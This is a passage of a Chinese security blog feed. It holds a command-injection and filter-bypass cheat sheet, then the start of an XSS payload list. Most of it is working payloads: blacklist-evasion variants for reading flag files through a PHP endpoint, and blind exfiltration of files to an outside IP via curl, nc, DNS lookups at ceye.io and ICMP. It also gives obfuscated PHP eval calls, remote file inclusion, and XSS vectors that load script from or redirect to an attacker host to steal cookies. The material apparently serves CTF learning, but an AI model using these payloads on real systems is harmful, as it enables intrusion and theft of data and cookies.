class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来的命令<br><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag.txt&quot;</code><br>绕过空格</p><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat%09flag.txt&quot;</code></p><p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh={ls,-l}&quot;</code></p><p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;&gt;flag.txt&quot;</code></p><p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;flag.txt&quot;</code></p><p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat${IFS}flag.txt&quot;</code>（这个记得要url编码下</p><p>6.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS$9flag.txt&quot;</code>（url编码下,$9是linux系统shell进程的第九个参数，始终为空字符串</p><p>7.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS\flag.txt&quot;</code><br>备注：按道理来说<code>curl -G --data-urlencode &quot;museljh=cat flag.txt&quot; http://120.77.176.168/test.php</code>这样是可以直接urlencode编码的，但是却不行。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="/绕过"></a>/绕过</h3><p>首先我们先知道一些小知识</p><p><code>echo ${PATH}</code>在我环境中输出为</p><p><code>/opt/Java/bin:/opt/Java/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$JAVA_HOME/bin:/home/taoyx/program_develop/go_demo:/usr/local/go/bin</code><br><code>${PATH:0:1}</code>代表以上字符的第一个也就是/,这样我们就可以得到了，当然我感觉这样的方法应该还有很多，指不止PATH，</p><p>当然这也可以使用正则匹配，比如<code>${PATH%%o*}</code> <code>%%o.*</code> 表示从右向左匹配 <code>o.*</code> 并删除,这样就不用：。</p><p>同样的知识点<code>${PATH##*.}</code>表示非贪婪匹配，当然这个还有许多玩法就不一一说了。</p><p><code>echo ${LESSOPEN}</code><br><code>| /usr/bin/lesspipe %s</code></p><h3 id="加号-大于号绕过"><a href="#加号-大于号绕过" class="headerlink" title="加号/大于号绕过"></a>加号/大于号绕过</h3><p>PS1——默认提示符</p><p>PS2——再谈提示符</p><p>PS3——Shell脚本中使用select时的提示符</p><p>PS4——PS4-“set -x”用来修改跟踪输出的前缀</p><p><code>$PS4</code> 为 +号</p><p><code>$PS2</code> 为大于号</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="1-通配符利用"><a href="#1-通配符利用" class="headerlink" title="1.通配符利用"></a>1.通配符利用</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=/???/?at flag.txt&quot;</code></p><p>突然想到一个小结合</p><p><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=${PATH:0:1}???${PATH:0:1}?at%09flag.txt&quot;</code><br>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag*&quot;</code></p><h4 id="夹杂字符"><a href="#夹杂字符" class="headerlink" title="夹杂字符"></a>夹杂字符</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&#39;&#39;t flag.txt&quot;</code></p><p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca$1t flag.txt&quot;</code>(这里的1可以改成任何一位数字)</p><p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca\t flag.txt&quot;</code></p><p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca${x}t flag.txt&quot;</code></p><p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca``t flag.txt&quot;</code></p><p>6.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&quot;&quot;t flag.txt&quot;</code></p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;63617420666c61672e747874\&quot;|xxd -r -p|bash&quot;</code> (十六进制我本地莫名不行)</p><p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;Y2F0IGZsYWcudHh0\&quot;|base64 -d|bash&quot;</code></p><p>结合一波</p><p><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo%09\&quot;Y2F0IGZsYWcudHh0\&quot;|base64%09-d|bash&quot;</code></p><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat;b=flag.txt;$a $b;&quot;</code></p><p>若;被过滤还可以用%0a,%0d 代替</p><p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat%0ab=flag.txt%0a$a $b%0a&quot;</code></p><h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=curl 127.0.0.1|ls&quot;</code></p><p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls||curl 127.0.0.1&quot;</code></p><p>前面命令执行失败才会执行后面命令</p><p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;curl 127.0.0.1&quot;</code></p><p>命令同时执行 </p><p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;&amp;curl 127.0.0.1&quot;</code></p><p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。</p><p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls;curl 127.0.0.1&quot;</code></p><p>不管前面命令执行成功没有，后面的命令继续执行 </p><h4 id="ip中-绕过"><a href="#ip中-绕过" class="headerlink" title="ip中.绕过"></a>ip中.绕过</h4><p>将ip地址转换为数字地址</p><h4 id="巧借全局变量"><a href="#巧借全局变量" class="headerlink" title="巧借全局变量"></a>巧借全局变量</h4><p>上次一个比赛中学到的。<br>在如下条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;museljh&apos;]))&#123;</span><br><span class="line">  $muse=$_GET[&apos;museljh&apos;];</span><br><span class="line">  echo $muse,PHP_EOL;</span><br><span class="line">  #system($muse);</span><br><span class="line"> # system($_GET[&apos;b&apos;]);</span><br><span class="line"> eval($muse); </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;no!no!no!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=$pi=base_convert(9911,10,28);base_convert(1751504350,10,36)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42)); &quot;</code></p><p><code>system(&#39;cat /*&#39;);</code></p><ol start="2"><li><code>curl -l -w &#39;\n&#39; --header &#39;9: ls&#39;  &#39;http://120.77.176.168/test.php?museljh=system(getallheaders()\{9\});&#39;</code></li></ol><p><code>system(getallheaders(){9})</code></p><p>3.<code>GET/POST</code></p><h2 id="四、无回显命令执行"><a href="#四、无回显命令执行" class="headerlink" title="四、无回显命令执行"></a>四、无回显命令执行</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>万金油一般的存在，我之前已经写过一篇对此的小总结了。</p><h3 id="curl-T-museljh-txt-http-120-77-176-168-11122"><a href="#curl-T-museljh-txt-http-120-77-176-168-11122" class="headerlink" title="curl -T museljh.txt http://120.77.176.168:11122"></a><code>curl -T museljh.txt http://120.77.176.168:11122</code></h3><p>补充下ftp<code>curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{museljh}</code></p><p>备注：对于curl来说 -F 以及–data来说都默认改为POST请求方式</p><h3 id="curl-quot-http-120-77-176-168-11122-quot-data-binary-quot-museljh-txt-quot"><a href="#curl-quot-http-120-77-176-168-11122-quot-data-binary-quot-museljh-txt-quot" class="headerlink" title="curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;"></a><code>curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;</code></h3><h3 id="ping-whoami-ceye-io"><a href="#ping-whoami-ceye-io" class="headerlink" title="ping `whoami`.**.ceye.io"></a>ping `whoami`.<strong>**</strong>.ceye.io</h3><p>ceye.io是一个免费的DNS解析平台，会给每个注册用户一个免费的子域名同构构造类似ping `whoami`.<strong>**</strong>.ceye.io，命令可以将我们得到的结果传递给四级子域名，在ceye.io平台中就可以看到我们的DNS解析记录，嗯，有空再写篇博客研究下DNS隧道技术。这里不得不提下我看到的一个师傅文章中的一个操作，因为域名不能带空格，我们可以使用sed进行替换</p><p><code>格式：sed &#39;s/要替换的字符串/新的字符串/g&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat flag.txt|sed s/[[:space:]]/xx/g`.museljh.ceye.io</span><br></pre></td></tr></table></figure><p>这里还有要注意的，因为不仅仅是空格DNS解析的时候还是有挺多符号是不能解析的比如&#39;,不过要替换的东西可以用正则表示。（按道理来说一般flag里应该也没有什么特殊字符）</p><p>不过就算有多个我们也是可以绕过了，我暂时只想到这样的方法,办法确实是笨了点。不知道有没有师傅有更好办法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat museljh.txt|sed s/[[:space:]]/museljh/g|sed s/\&apos;/museljh/g`.8itzz8.ceye.io</span><br></pre></td></tr></table></figure><h3 id="curl-http-8itzz8-ceye-io-whoami"><a href="#curl-http-8itzz8-ceye-io-whoami" class="headerlink" title="curl http://8itzz8.ceye.io/`whoami`"></a>curl <code>http://8itzz8.ceye.io/</code>`whoami`</h3><p>和第3点原理一样只是换成curl而已,除此之外在ceye.io平台中还提供了sql等payload可以说是很赞的了。</p><h3 id="nc-l-p-11122-lt-museljh-txt，curl-http-120-x-176-x-11122"><a href="#nc-l-p-11122-lt-museljh-txt，curl-http-120-x-176-x-11122" class="headerlink" title="nc -l -p 11122 &lt;  museljh.txt，curl http://120.x.176.x:11122"></a><code>nc -l -p 11122 &lt;  museljh.txt</code>，<code>curl http://120.x.176.x:11122</code></h3><p>使用nc将文件重定向到监听端，我们访问这个监听端即可</p><h3 id="wget-header-quot-museljh-cat-flag-txt-quot-http-120-77-176-168-11122"><a href="#wget-header-quot-museljh-cat-flag-txt-quot-http-120-77-176-168-11122" class="headerlink" title="wget --header=&quot;museljh:cat flag.txt&quot; http://120.77.176.168:11122"></a><code>wget --header=&quot;museljh:</code>cat flag.txt<code>&quot; http://120.77.176.168:11122</code></h3><h3 id="cat-flag-txt-xxd-p-c-16-while-read-exfil-do-ping-p-exfil-c-1-127-0-0-1-done"><a href="#cat-flag-txt-xxd-p-c-16-while-read-exfil-do-ping-p-exfil-c-1-127-0-0-1-done" class="headerlink" title="cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done"></a><code>cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done</code></h3><p>使用ICMP，可以看日志，可以用tcpdump抓包。<br>收到启发，同样想到可以这样</p><p><code>cat flag.txt |sed s/[[:space:]]/xx/g|while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done</code></p><p>这样,这里是可以不用使用空格的，我这边sed是多余的。使用类似这样的方法就可以解决之前DNS解析无法使用空格等非法字符了。</p><p><code>cat flag.txt |sed s/[[:space:]]/xx/g| xxd -p -c 16 | while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done</code></p><p>以下是我没试过的，只是列出来</p><h3 id="net-use-h-xxx-xxx-xxx-xxx-web-user-username-museljh-amp-amp-copy-File-to-Copy-h-filename-txt"><a href="#net-use-h-xxx-xxx-xxx-xxx-web-user-username-museljh-amp-amp-copy-File-to-Copy-h-filename-txt" class="headerlink" title="net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txt"></a><code>net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txt</code></h3><h3 id="telnet-xxx-xxx-xxx-xxx-port-lt-file-to-transfer"><a href="#telnet-xxx-xxx-xxx-xxx-port-lt-file-to-transfer" class="headerlink" title="telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}"></a><code>telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}</code></h3><p>总的来说还是反弹shell比较合算</p><h2 id="五、畸变的webshell"><a href="#五、畸变的webshell" class="headerlink" title="五、畸变的webshell"></a>五、畸变的webshell</h2><h2 id="六、PHP文件读取函数"><a href="#六、PHP文件读取函数" class="headerlink" title="六、PHP文件读取函数"></a>六、PHP文件读取函数</h2><h3 id="集合-2"><a href="#集合-2" class="headerlink" title="集合"></a>集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents（）、highlight_file（）、fopen（）、readfile（）、fread（）、fgetss（）、fgets（）、parse_ini_file（）、show_source（）、file（）</span><br></pre></td></tr></table></figure><h2 id="七、PHP输出当前进程所有变量-常量-模块-函数-类"><a href="#七、PHP输出当前进程所有变量-常量-模块-函数-类" class="headerlink" title="七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类"></a>七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类</h2><h3 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions()"></a><code>get_defined_functions()</code></h3><p><code>get_defined_functions</code> — 返回所有已定义函数的数组<br><code>get_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function myrow($id, $data)</span><br><span class="line">&#123;</span><br><span class="line">    return &quot;&lt;tr&gt;&lt;th&gt;$id&lt;/th&gt;&lt;td&gt;$data&lt;/td&gt;&lt;/tr&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = get_defined_functions();</span><br><span class="line"></span><br><span class="line">print_r($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h3><p><code>get_defined_vars</code> — 返回由所有已定义变量所组成的数组</p><p><code>get_defined_vars ( void ) : array</code></p><p>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &apos;&lt;pre&gt;&apos;;  </span><br><span class="line">$vars = get_defined_vars();</span><br><span class="line">$b = array(1,1,2,3,5,8);  </span><br><span class="line">  </span><br><span class="line">$arr = get_defined_vars();  </span><br><span class="line">  </span><br><span class="line">// 打印 $b  </span><br><span class="line">//print_r($arr[&quot;b&quot;]);  </span><br><span class="line">  </span><br><span class="line">// 打印所有服务器变量  </span><br><span class="line">//print_r($arr[&quot;_SERVER&quot;]);  </span><br><span class="line">  </span><br><span class="line">// 打印变量数组的所有可用键值  </span><br><span class="line">print_r(get_defined_vars());  </span><br><span class="line">print_r(array_keys(get_defined_vars()));  </span><br><span class="line">$vars = array_diff(get_defined_vars(),$vars);</span><br><span class="line">print_r($vars);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="get-loaded-extensions"><a href="#get-loaded-extensions" class="headerlink" title="get_loaded_extensions()"></a><code>get_loaded_extensions()</code></h3><p><code>get_loaded_extensions</code> — 返回所有编译并加载模块名的 array</p><p><code>get_loaded_extensions ([ bool $zend_extensions = false ] ) : array</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_loaded_extensions());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="get-extension-funcs"><a href="#get-extension-funcs" class="headerlink" title="get_extension_funcs()"></a><code>get_extension_funcs()</code></h3><p><code>get_extension_funcs</code> — 返回模块函数名称的数组</p><p><code>get_extension_funcs ( string $module_name ) : array</code></p><p>该函数根据 module_name 返回模块内定义的所有函数的名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_extension_funcs(&quot;curl&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="get-defined-constants"><a href="#get-defined-constants" class="headerlink" title="get_defined_constants()"></a><code>get_defined_constants()</code></h3><p><code>get_defined_constants</code> — 返回所有常量的关联数组，键是常量名，值是常量值</p><p><code>get_defined_constants ([ bool $categorize = false ] ) : array</code></p><p>返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_defined_constants());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="get-declared-classes"><a href="#get-declared-classes" class="headerlink" title="get_declared_classes()"></a><code>get_declared_classes()</code></h3><p><code>get_declared_classes</code> — 返回由已定义类的名字所组成的数组</p><p><code>get_declared_classes ( void ) : array</code></p><p>返回由当前脚本中已定义类的名字组成的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_declared_classes());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="八、杂"><a href="#八、杂" class="headerlink" title="八、杂"></a>八、杂</h2><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code>, 文件包含相关函数有: <code>include, include_once, require, require_once</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E</code>, 即执行phpinfo()。</p><h3 id="反序列化验证绕过"><a href="#反序列化验证绕过" class="headerlink" title="反序列化验证绕过"></a>反序列化验证绕过</h3><p><code>O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.beesfun.com/2017/04/18/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">PHP代码注入和命令注入</a></p><p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">php代码-命令执行漏洞</a></p><p><a href="http://www.cszhi.com/20111212/php_exec_system_shell_exec_passthru.html" target="_blank" rel="noopener">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec()</a></p><p><a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">命令执行与代码执行的小结</a></p><p><a href="https://pplsec.github.io/2019/01/17/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">PHP命令执行&amp;代码执行</a></p><p><a href="https://hl0rey.github.io/2018/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">代码审计之代码执行</a></p><a href="https://lorexxar.cn/2015/12/21/dmsj-book/" target="_blank" rel="noopener">《代码审计》一点儿笔记</a><p><a href="http://www.cnblogs.com/LittleHann/p/3522990.html" target="_blank" rel="noopener">Deformity PHP Webshell、Webshell Hidden Learning</a></p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">Bypass_Disable_functions_Shell</a></p><p><a href="http://www.icyfire.me/2014/06/27/php-program-execution.html" target="_blank" rel="noopener">PHP函数篇之执行外部程序</a></p><p><a href="https://www.anquanke.com/post/id/168093" target="_blank" rel="noopener">PHP-escapeshell-命令执行</a></p><p><a href="http://sunu11.com/2019/01/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93%E4%B8%8Etips/" target="_blank" rel="noopener">命令执行总结与tips</a></p><p><a href="https://www.freebuf.com/articles/web/88354.html" target="_blank" rel="noopener">技术分析：攻击者是如何利用系统命令盲注实现“拖库”的？</a></p><p><a href="http://www.tharavel.site/2018/03/23/command-execute.html" target="_blank" rel="noopener">各种命令执行总结</a></p>]]></content>
    
    <summary type="html">
    
      总结下关于命令&amp;代码执行以及绕过方面的知识
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="命令执行" scheme="https://museljh.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>xss小结</title>
    <link href="https://museljh.github.io/2019/04/24/xss%E5%B0%8F%E7%BB%93/"/>
    <id>https://museljh.github.io/2019/04/24/xss小结/</id>
    <published>2019-04-24T07:24:20.000Z</published>
    <updated>2019-04-24T07:33:01.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS语句"><a href="#XSS语句" class="headerlink" title="XSS语句"></a>XSS语句</h2><h2 id="反射XSS语句"><a href="#反射XSS语句" class="headerlink" title="反射XSS语句"></a>反射XSS语句</h2><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onfocus=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>4.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=alert(/xss/) autofocus&gt;</span><br></pre></td></tr></table></figure><p>5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top.alert(1)&gt;</span><br></pre></td></tr></table></figure><p>6.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top[&apos;prompt&apos;](1)&gt;</span><br></pre></td></tr></table></figure><p>7.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(‘alert(1)’) &gt;</span><br></pre></td></tr></table></figure><p>8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>9.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;YWxlcnQoMSk=&apos;)) &gt;</span><br></pre></td></tr></table></figure><p>10.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\141\154\145\162\164\50\61\51&apos;) &gt;</span><br></pre></td></tr></table></figure><p>11.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) &gt;</span><br></pre></td></tr></table></figure><p>12.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&quot;appendChild(createElement(&apos;script&apos;)).src=&apos;http://120.77.176.168:11122&apos;&quot;) &gt;</span><br></pre></td></tr></table></figure><p>13.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window.alert(1) &gt;</span><br></pre></td></tr></table></figure><p>14.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](alert(1)) &gt;</span><br></pre></td></tr></table></figure><p>15.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=alert,_(/xss/) &gt;</span><br></pre></td></tr></table></figure><p>16.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=&apos;e&apos;+&apos;val&apos;,_(alert(1)) &gt;</span><br></pre></td></tr></table></figure><p>17.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=&apos;javascri&apos;.concat(&apos;pt:aler&apos;,&apos;t(1)&apos;)&gt;</span><br></pre></td></tr></table></figure><p>18.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&apos;java&apos;,&apos;script:&apos;,&apos;alert(1)&apos;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>19.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br></pre></td></tr></table></figure><p>20.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&apos;\141\154\145\162\164\50\61\51&apos;)&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS窃取cookie"><a href="#XSS窃取cookie" class="headerlink" title="XSS窃取cookie"></a>XSS窃取cookie</h2><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe 